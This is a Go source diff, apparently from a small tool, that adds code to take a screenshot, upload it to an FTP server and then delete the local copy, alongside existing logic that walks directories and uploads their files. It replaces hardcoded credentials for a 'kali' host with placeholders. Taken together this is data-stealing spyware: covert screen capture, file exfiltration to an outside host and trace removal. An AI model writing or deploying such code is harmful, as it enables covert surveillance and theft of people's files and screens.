@@ -26,6 +26,16 @@ func listFilesInDir(dirPath string) ([]string, error) {
 }
 
 func main() {
+
+	//Take screenshot
+	screenshotPath := "screenshot.png" // Where save the screenshot
+	fmt.Println("Capturing screenshot...")
+	err := CaptureScreenshot(screenshotPath)
+	if err != nil {
+		log.Fatalf("Error capturing screenshot: %v", err)
+	}
+	fmt.Printf("Screenshot saved to %s\n", screenshotPath)
+
 	// Get directory from "directory.go"
 	directories, err := GetDirectories()
 	if err != nil {
@@ -33,17 +43,34 @@ func main() {
 	}
 
 	// FTP configuration
-	ftpServer := "192.168.60.133"
-	ftpPort := 21
-	ftpUser := "kali"
-	ftpPassword := "qwerty1234"
+	ftpServer := "<FTP_SERVER>"
+	ftpPort := <PORT>
+	ftpUser := "<USERNAME>"
+	ftpPassword := "<PASSWORD>"
 
-	// call to FTP connection function on "ftp.go"
+	// Call to FTP connection function
 	ftpClient, err := ConnectToFTP(ftpServer, ftpPort, ftpUser, ftpPassword)
 	if err != nil {
 		log.Fatalf("Error connecting to FTP: %v", err)
 	}
 	defer ftpClient.Quit()
+
+	// Load screenshot
+	fmt.Println("Uploading screenshot to FTP server...")
+	remotePath := filepath.Base(screenshotPath)
+	err = UploadFileToFTP(ftpClient, screenshotPath, remotePath)
+	if err != nil {
+		log.Fatalf("Failed to upload screenshot: %v", err)
+	}
+	fmt.Printf("Screenshot uploaded successfully as %s\n", remotePath)
+
+	// Delete screenshot from computer
+	fmt.Println("Deleting local screenshot...")
+	err = os.Remove(screenshotPath)
+	if err != nil {
+		log.Fatalf("Failed to delete local screenshot: %v", err)
+	}
+	fmt.Println("Local screenshot deleted successfully.")
 
 	// Explore directory and upload file
 	for _, dir := range directories {
